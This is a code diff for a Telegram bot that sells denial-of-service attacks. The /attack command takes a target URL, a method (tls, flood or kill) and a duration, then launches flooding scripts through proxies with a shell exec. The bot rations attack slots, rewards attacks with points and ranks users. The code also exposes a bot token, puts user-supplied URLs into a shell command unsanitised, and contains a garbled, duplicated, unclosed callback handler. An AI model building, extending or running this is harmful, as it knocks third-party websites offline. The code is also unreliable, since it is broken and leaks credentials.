@@ -5,7 +5,7 @@ const { exec } = require("child_process");
 
 const token = "7903023411:AAHxE6o_hdibPehD27m1qd9xWnTGYyY_Znc";
 const bot = new TelegramBot(token, { polling: true });
-const admins = [6601930239];
+const admins = [6601930239, 1848131455];
 const subAdmins = [7245377580, 7566935490];
 const groupId = -1002370415846;
 const requiredGroup = -1002370415846;
@@ -87,7 +87,7 @@ const messages = {
 db.exec(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
 CREATE TABLE IF NOT EXISTS blacklist (keyword TEXT PRIMARY KEY);
 CREATE TABLE IF NOT EXISTS slots (userId INTEGER, url TEXT, method TEXT, endTime INTEGER, fullName TEXT, PRIMARY KEY(userId, url, method));
-CREATE TABLE IF NOT EXISTS users (userId INTEGER PRIMARY KEY, points INTEGER DEFAULT 0, lastCheckin TEXT, attacksToday INTEGER DEFAULT 0, lastAttackDate TEXT, language TEXT DEFAULT 'vi', totalAttacks INTEGER DEFAULT 0);`);
+CREATE TABLE IF NOT EXISTS users (userId INTEGER PRIMARY KEY, points INTEGER DEFAULT 0, lastCheckin TEXT, attacksToday INTEGER DEFAULT 0, lastAttackDate TEXT, totalAttacks INTEGER DEFAULT 0);`);
 
 const getSetting = db.prepare("SELECT value FROM settings WHERE key=?");
 const setSetting = db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)");
@@ -99,11 +99,10 @@ const addSlot = db.prepare("INSERT INTO slots (userId, url, method, endTime, ful
 const removeSlot = db.prepare("DELETE FROM slots WHERE userId=? AND url=? AND method=?");
 const removeExpiredSlots = db.prepare("DELETE FROM slots WHERE endTime <= ?");
 const getUser = db.prepare("SELECT * FROM users WHERE userId=?");
-const addUser = db.prepare("INSERT OR IGNORE INTO users (userId, points, lastCheckin, attacksToday, lastAttackDate, language, totalAttacks) VALUES (?, 0, '', 0, '', 'vi', 0)");
+const addUser = db.prepare("INSERT OR IGNORE INTO users (userId, points, lastCheckin, attacksToday, lastAttackDate, totalAttacks) VALUES (?, 0, '', 0, '', 0)");
 const updateUserPoints = db.prepare("UPDATE users SET points=? WHERE userId=?");
 const updateUserCheckin = db.prepare("UPDATE users SET lastCheckin=? WHERE userId=?");
 const updateUserAttacks = db.prepare("UPDATE users SET attacksToday=?, lastAttackDate=? WHERE userId=?");
-const updateUserLanguage = db.prepare("UPDATE users SET language=? WHERE userId=?");
 const incrementTotalAttacks = db.prepare("UPDATE users SET totalAttacks = totalAttacks + 1 WHERE userId=?");
 const getTopUsers = db.prepare("SELECT userId, totalAttacks FROM users WHERE totalAttacks > 0 ORDER BY totalAttacks DESC LIMIT 20");
 
@@ -142,36 +141,31 @@ function isSubAdmin(userId) {
     return subAdmins.includes(userId);
 }
 
-function getUserLanguage(userId) {
-    addUser.run(userId);
-    const user = getUser.get(userId);
-    return user.language || 'vi';
-}
-
-function getMessage(userId, key, replacements = {}) {
-    const lang = getUserLanguage(userId);
+function getMessage(key, lang = 'vi', replacements = {}) {
     let message = messages[lang][key] || messages['vi'][key];
-    
     Object.keys(replacements).forEach(placeholder => {
         message = message.replace(new RegExp(`{${placeholder}}`, 'g'), replacements[placeholder]);
     });
-    
     return message;
+}
+
+function createTranslateButton() {
+    return {
+        reply_markup: {
+            inline_keyboard: [[
+                { text: "Translate To English </>", callback_data: "translate_en" }
+            ]]
+        }
+    };
 }
 
 async function checkMembership(userId) {
     if (isAdmin(userId) || isSubAdmin(userId)) return true;
     
     try {
-        const [groupMember, channelMember] = await Promise.all([
-            bot.getChatMember(requiredGroup, userId).catch(err => null),
-            bot.getChatMember(requiredChannel, userId).catch(err => null)
-        ]);
-        
-        const isGroupMember = groupMember && ['member', 'administrator', 'creator'].includes(groupMember.status);
-        const isChannelMember = channelMember && ['member', 'administrator', 'creator'].includes(channelMember.status);
-        
-        return isGroupMember && isChannelMember;
+        await bot.getChatMember(requiredGroup, userId);
+        await bot.getChatMember(requiredChannel, userId);
+        return true;
     } catch (error) {
         return false;
     }
@@ -200,29 +194,15 @@ bot.onText(/\/start/, async (msg) => {
     const userId = msg.from.id;
     
     if (!(await isAllowed(chatId, userId))) {
-        bot.sendMessage(chatId, getMessage(userId, 'notMember'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
         return;
     }
     
     addUser.run(userId);
-    bot.sendMessage(chatId, getMessage(userId, 'start'), { parse_mode: "Markdown" });
-});
-
-bot.onText(/\/lang (vi|en)/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const language = match[1];
-    
-    if (!(await isAllowed(chatId, userId))) {
-        bot.sendMessage(chatId, getMessage(userId, 'notMember'), { parse_mode: "Markdown" });
-        return;
-    }
-    
-    addUser.run(userId);
-    updateUserLanguage.run(language, userId);
-    
-    const confirmMessage = language === 'vi' ? 'Đã chuyển sang tiếng Việt' : 'Language changed to English';
-    bot.sendMessage(chatId, confirmMessage, { parse_mode: "Markdown" });
+    bot.sendMessage(chatId, getMessage('start'), { 
+        parse_mode: "Markdown", 
+        ...createTranslateButton() 
+    });
 });
 
 bot.onText(/\/methods/, async (msg) => {
@@ -230,11 +210,14 @@ bot.onText(/\/methods/, async (msg) => {
     const userId = msg.from.id;
     
     if (!(await isAllowed(chatId, userId))) {
-        bot.sendMessage(chatId, getMessage(userId, 'notMember'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
         return;
     }
     
-    bot.sendMessage(chatId, getMessage(userId, 'methods'), { parse_mode: "Markdown" });
+    bot.sendMessage(chatId, getMessage('methods'), { 
+        parse_mode: "Markdown", 
+        ...createTranslateButton() 
+    });
 });
 
 bot.onText(/\/daily/, async (msg) => {
@@ -242,12 +225,12 @@ bot.onText(/\/daily/, async (msg) => {
     const userId = msg.from.id;
     
     if (!(await isAllowed(chatId, userId))) {
-        bot.sendMessage(chatId, getMessage(userId, 'notMember'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
         return;
     }
     
     if (isAdmin(userId) || isSubAdmin(userId)) {
-        bot.sendMessage(chatId, getMessage(userId, 'adminNoCheckin'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('adminNoCheckin'), createTranslateButton());
         return;
     }
     
@@ -256,14 +239,14 @@ bot.onText(/\/daily/, async (msg) => {
     const today = getTodayString();
     
     if (user.lastCheckin === today) {
-        bot.sendMessage(chatId, getMessage(userId, 'alreadyCheckedIn'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('alreadyCheckedIn'), createTranslateButton());
         return;
     }
     
     const newPoints = user.points + 300;
     updateUserPoints.run(newPoints, userId);
     updateUserCheckin.run(today, userId);
-    bot.sendMessage(chatId, getMessage(userId, 'checkinSuccess', { points: newPoints }), { parse_mode: "Markdown" });
+    bot.sendMessage(chatId, getMessage('checkinSuccess', 'vi', { points: newPoints }), createTranslateButton());
 });
 
 bot.onText(/\/stats/, async (msg) => {
@@ -271,7 +254,7 @@ bot.onText(/\/stats/, async (msg) => {
     const userId = msg.from.id;
     
     if (!(await isAllowed(chatId, userId))) {
-        bot.sendMessage(chatId, getMessage(userId, 'notMember'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
         return;
     }
     
@@ -293,7 +276,10 @@ bot.onText(/\/stats/, async (msg) => {
         }
     }
     
-    bot.sendMessage(chatId, getMessage(userId, 'stats', { list: statsText }), { parse_mode: "Markdown" });
+    bot.sendMessage(chatId, getMessage('stats', 'vi', { list: statsText }), { 
+        parse_mode: "Markdown", 
+        ...createTranslateButton() 
+    });
 });
 
 bot.onText(/\/blacklist(?:\s+)?$/, (msg) => {
@@ -301,13 +287,16 @@ bot.onText(/\/blacklist(?:\s+)?$/, (msg) => {
     const userId = msg.from.id;
     
     if (!isAdmin(userId)) {
-        bot.sendMessage(chatId, getMessage(userId, 'noPermission'));
+        bot.sendMessage(chatId, getMessage('noPermission'), createTranslateButton());
         return;
     }
     
     const bl = getAllBlacklist.all().map(r => r.keyword);
-    const listText = bl.length ? bl.map(k => `- \`${k}\``).join("\n") : getMessage(userId, 'blacklistEmpty');
-    bot.sendMessage(chatId, getMessage(userId, 'blacklistCurrent', { list: listText }), { parse_mode: "Markdown" });
+    const listText = bl.length ? bl.map(k => `- \`${k}\``).join("\n") : getMessage('blacklistEmpty');
+    bot.sendMessage(chatId, getMessage('blacklistCurrent', 'vi', { list: listText }), { 
+        parse_mode: "Markdown", 
+        ...createTranslateButton() 
+    });
 });
 
 bot.onText(/\/blacklist (add|remove) (.+)/, (msg, match) => {
@@ -315,7 +304,7 @@ bot.onText(/\/blacklist (add|remove) (.+)/, (msg, match) => {
     const userId = msg.from.id;
     
     if (!isAdmin(userId)) {
-        bot.sendMessage(chatId, getMessage(userId, 'noPermission'));
+        bot.sendMessage(chatId, getMessage('noPermission'), createTranslateButton());
         return;
     }
     
@@ -326,17 +315,29 @@ bot.onText(/\/blacklist (add|remove) (.+)/, (msg, match) => {
         if (!blacklist.includes(keyword)) {
             blacklist.push(keyword);
             addBlacklist.run(keyword);
-            bot.sendMessage(chatId, getMessage(userId, 'blacklistAdded', { keyword }), { parse_mode: "Markdown" });
+            bot.sendMessage(chatId, getMessage('blacklistAdded', 'vi', { keyword }), { 
+                parse_mode: "Markdown", 
+                ...createTranslateButton() 
+            });
         } else {
-            bot.sendMessage(chatId, getMessage(userId, 'blacklistExists', { keyword }), { parse_mode: "Markdown" });
+            bot.sendMessage(chatId, getMessage('blacklistExists', 'vi', { keyword }), { 
+                parse_mode: "Markdown", 
+                ...createTranslateButton() 
+            });
         }
     } else if (action === "remove") {
         if (blacklist.includes(keyword)) {
             blacklist = blacklist.filter(k => k !== keyword);
             removeBlacklist.run(keyword);
-            bot.sendMessage(chatId, getMessage(userId, 'blacklistRemoved', { keyword }), { parse_mode: "Markdown" });
+            bot.sendMessage(chatId, getMessage('blacklistRemoved', 'vi', { keyword }), { 
+                parse_mode: "Markdown", 
+                ...createTranslateButton() 
+            });
         } else {
-            bot.sendMessage(chatId, getMessage(userId, 'blacklistNotExists', { keyword }), { parse_mode: "Markdown" });
+            bot.sendMessage(chatId, getMessage('blacklistNotExists', 'vi', { keyword }), { 
+                parse_mode: "Markdown", 
+                ...createTranslateButton() 
+            });
         }
     }
 });
@@ -346,14 +347,17 @@ bot.onText(/\/maintenance/, (msg) => {
     const userId = msg.from.id;
     
     if (!isAdmin(userId)) {
-        bot.sendMessage(chatId, getMessage(userId, 'noPermission'));
+        bot.sendMessage(chatId, getMessage('noPermission'), createTranslateButton());
         return;
     }
     
     maintenance = !maintenance;
     setSetting.run("maintenance", maintenance ? "true" : "false");
-    const status = maintenance ? (getUserLanguage(userId) === 'vi' ? 'Bật' : 'On') : (getUserLanguage(userId) === 'vi' ? 'Tắt' : 'Off');
-    bot.sendMessage(chatId, getMessage(userId, 'maintenanceToggle', { status }), { parse_mode: "Markdown" });
+    const status = maintenance ? 'Bật' : 'Tắt';
+    bot.sendMessage(chatId, getMessage('maintenanceToggle', 'vi', { status }), { 
+        parse_mode: "Markdown", 
+        ...createTranslateButton() 
+    });
 });
 
 bot.onText(/\/ongoing/, async (msg) => {
@@ -361,7 +365,7 @@ bot.onText(/\/ongoing/, async (msg) => {
     const userId = msg.from.id;
     
     if (!(await isAllowed(chatId, userId))) {
-        bot.sendMessage(chatId, getMessage(userId, 'notMember'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
         return;
     }
     
@@ -370,10 +374,10 @@ bot.onText(/\/ongoing/, async (msg) => {
     const slots = getAllSlots.all();
     
     if (!slots.length) {
-        bot.sendMessage(chatId, getMessage(userId, 'noOngoingSlots', { 
+        bot.sendMessage(chatId, getMessage('noOngoingSlots', 'vi', { 
             available: maxSlots, 
             max: maxSlots 
-        }), { parse_mode: "Markdown" });
+        }), { parse_mode: "Markdown", ...createTranslateButton() });
         return;
     }
     
@@ -384,11 +388,11 @@ bot.onText(/\/ongoing/, async (msg) => {
         attacksText += `\n${i + 1}. **User:** \`${s.fullName}\`\n   **URL:** \`${s.url}\`\n   **Method:** \`${s.method}\`\n   **Time left:** \`${timeLeft}s\``;
     });
     
-    bot.sendMessage(chatId, getMessage(userId, 'ongoingAttacks', {
+    bot.sendMessage(chatId, getMessage('ongoingAttacks', 'vi', {
         attacks: attacksText,
         available: maxSlots - slots.length,
         max: maxSlots
-    }), { parse_mode: "Markdown" });
+    }), { parse_mode: "Markdown", ...createTranslateButton() });
 });
 
 bot.onText(/\/attack$/, async (msg) => {
@@ -396,11 +400,14 @@ bot.onText(/\/attack$/, async (msg) => {
     const userId = msg.from.id;
     
     if (!(await isAllowed(chatId, userId))) {
-        bot.sendMessage(chatId, getMessage(userId, 'notMember'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
         return;
     }
     
-    bot.sendMessage(chatId, getMessage(userId, 'attackSyntax'), { parse_mode: "Markdown" });
+    bot.sendMessage(chatId, getMessage('attackSyntax'), { 
+        parse_mode: "Markdown", 
+        ...createTranslateButton() 
+    });
 });
 
 bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\d+))?/, async (msg, match) => {
@@ -408,12 +415,12 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
     const userId = msg.from.id;
     
     if (!(await isAllowed(chatId, userId))) {
-        bot.sendMessage(chatId, getMessage(userId, 'notMember'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
         return;
     }
     
     if (maintenance && !isAdmin(userId)) {
-        bot.sendMessage(chatId, getMessage(userId, 'maintenance'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('maintenance'), createTranslateButton());
         return;
     }
     
@@ -430,17 +437,17 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
     let threads = match[5] ? parseInt(match[5]) : 5;
     
     if (!methods.includes(method)) {
-        bot.sendMessage(chatId, getMessage(userId, 'invalidMethod'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('invalidMethod'), createTranslateButton());
         return;
     }
     
     if (blacklist.some(k => url.includes(k))) {
-        bot.sendMessage(chatId, getMessage(userId, 'blacklistedUrl'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('blacklistedUrl'), createTranslateButton());
         return;
     }
     
     if (time < 10) {
-        bot.sendMessage(chatId, getMessage(userId, 'minTime'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('minTime'), createTranslateButton());
         return;
     }
     
@@ -451,7 +458,7 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
     } else if (isSubAdmin(userId)) {
         if (time > 260) time = 260;
         if (user.lastAttackDate === today && user.attacksToday >= 10) {
-            bot.sendMessage(chatId, getMessage(userId, 'maxAttacks'), { parse_mode: "Markdown" });
+            bot.sendMessage(chatId, getMessage('maxAttacks'), createTranslateButton());
             return;
         }
         rate = 17;
@@ -461,7 +468,7 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
     } else {
         if (time > 60) time = 60;
         if (user.points < 100) {
-            bot.sendMessage(chatId, getMessage(userId, 'notEnoughPoints'), { parse_mode: "Markdown" });
+            bot.sendMessage(chatId, getMessage('notEnoughPoints'), createTranslateButton());
             return;
         }
         rate = 17;
@@ -472,14 +479,14 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
     
     syncSlotsFromDb();
     if (activeSlots >= maxSlots) {
-        bot.sendMessage(chatId, getMessage(userId, 'noSlotsAvailable'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('noSlotsAvailable'), createTranslateButton());
         return;
     }
     
     const now = Date.now();
     if (now - lastAttackTime < cooldown) {
         const waitTime = Math.ceil((cooldown - (now - lastAttackTime)) / 1000);
-        bot.sendMessage(chatId, getMessage(userId, 'cooldownWait', { seconds: waitTime }), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('cooldownWait', 'vi', { seconds: waitTime }), createTranslateButton());
         return;
     }
     
@@ -501,37 +508,33 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
     setSetting.run("activeSlots", activeSlots.toString());
     lastAttackTime = now;
     
-    bot.sendMessage(chatId, getMessage(userId, 'attackSent', {
-        url,
-        method,
-        time,
-        rate,
-        threads
-    }), { parse_mode: "Markdown" });
+    bot.sendMessage(chatId, getMessage('attackSent', 'vi', {
+        url, method, time, rate, threads
+    }), { parse_mode: "Markdown", ...createTranslateButton() });
     
     if (!isAdmin(userId)) {
-        bot.sendMessage(groupId, getMessage(userId, 'attackNotification', {
-            fullName,
-            method,
-            rate,
-            threads,
-            time,
-            slot: slotInfo
+        bot.sendMessage(groupId, getMessage('attackNotification', 'vi', {
+            fullName, method, rate, threads, time, slot: slotInfo
         }), { parse_mode: "Markdown" });
     }
     
     exec(`node ${method}.js ${url} ${time} ${rate} ${threads} proxy.txt`, (error, stdout, stderr) => {
         removeSlot.run(userId, url, method);
         syncSlotsFromDb();
-        bot.sendMessage(groupId, getMessage(userId, 'slotCompleted', { 
-            active: activeSlots, 
-            max: maxSlots 
+        bot.sendMessage(groupId, getMessage('slotCompleted', 'vi', { 
+            active: activeSlots, max: maxSlots 
         }), { parse_mode: "Markdown" });
         
         if (error) {
-            bot.sendMessage(chatId, getMessage(userId, 'error', { error: error.message }), { parse_mode: "Markdown" });
+            bot.sendMessage(chatId, getMessage('error', 'vi', { error: error.message }), { 
+                parse_mode: "Markdown", 
+                ...createTranslateButton() 
+            });
         } else {
-            bot.sendMessage(chatId, getMessage(userId, 'completed', { output: stdout }), { parse_mode: "Markdown" });
+            bot.sendMessage(chatId, getMessage('completed', 'vi', { output: stdout }), { 
+                parse_mode: "Markdown", 
+                ...createTranslateButton() 
+            });
         }
     });
 });
@@ -541,12 +544,12 @@ bot.onText(/\/system/, async (msg) => {
     const userId = msg.from.id;
     
     if (!(await isAllowed(chatId, userId))) {
-        bot.sendMessage(chatId, getMessage(userId, 'notMember'), { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, getMessage('notMember'), createTranslateButton());
         return;
     }
     
     if (!isAdmin(userId)) {
-        bot.sendMessage(chatId, getMessage(userId, 'noPermission'));
+        bot.sendMessage(chatId, getMessage('noPermission'), createTranslateButton());
         return;
     }
     
@@ -556,17 +559,82 @@ bot.onText(/\/system/, async (msg) => {
         const mem = await si.mem();
         const disk = await si.fsSize();
         
-        bot.sendMessage(chatId, getMessage(userId, 'systemInfo', {
+        bot.sendMessage(chatId, getMessage('systemInfo', 'vi', {
             cpu: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores)`,
             os: osInfo.distro,
             totalRam: (mem.total / (1024 ** 3)).toFixed(2),
             freeRam: (mem.free / (1024 ** 3)).toFixed(2),
             usedDisk: (disk[0].used / (1024 ** 3)).toFixed(2),
             totalDisk: (disk[0].size / (1024 ** 3)).toFixed(2)
-        }), { parse_mode: "Markdown" });
+        }), { parse_mode: "Markdown", ...createTranslateButton() });
     } catch (e) {
         bot.sendMessage(chatId, `Error getting system info: ${e.message}`);
     }
+});
+
+bot.on('callback_query', async (callbackQuery) => {
+    const message = callbackQuery.message;
+    const data = callbackQuery.data;
+    
+    if (data === 'translate_en') {
+        const originalText = message.text;
+        let translatedText = originalText;
+        
+bot.on('callback_query', async (callbackQuery) => {
+    const message = callbackQuery.message;
+    const data = callbackQuery.data;
+    
+    if (data === 'translate_en') {
+        const originalText = message.text;
+        let translatedText = originalText;
+        
+        Object.keys(messages.vi).forEach(key => {
+            if (originalText.includes(messages.vi[key].split('\n')[0])) {
+                translatedText = messages.en[key];
+            }
+        });
+        
+        try {
+            await bot.editMessageText(translatedText, {
+                chat_id: message.chat.id,
+                message_id: message.message_id,
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: "Translate To Vietnamese </>", callback_data: "translate_vi" }
+                    ]]
+                }
+            });
+        } catch (error) {
+            console.log('Edit message error:', error.message);
+        }
+    } else if (data === 'translate_vi') {
+        const originalText = message.text;
+        let translatedText = originalText;
+        
+        Object.keys(messages.en).forEach(key => {
+            if (originalText.includes(messages.en[key].split('\n')[0])) {
+                translatedText = messages.vi[key];
+            }
+        });
+        
+        try {
+            await bot.editMessageText(translatedText, {
+                chat_id: message.chat.id,
+                message_id: message.message_id,
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: "Translate To English </>", callback_data: "translate_en" }
+                    ]]
+                }
+            });
+        } catch (error) {
+            console.log('Edit message error:', error.message);
+        }
+    }
+    
+    bot.answerCallbackQuery(callbackQuery.id);
 });
 
 process.on('SIGINT', () => {
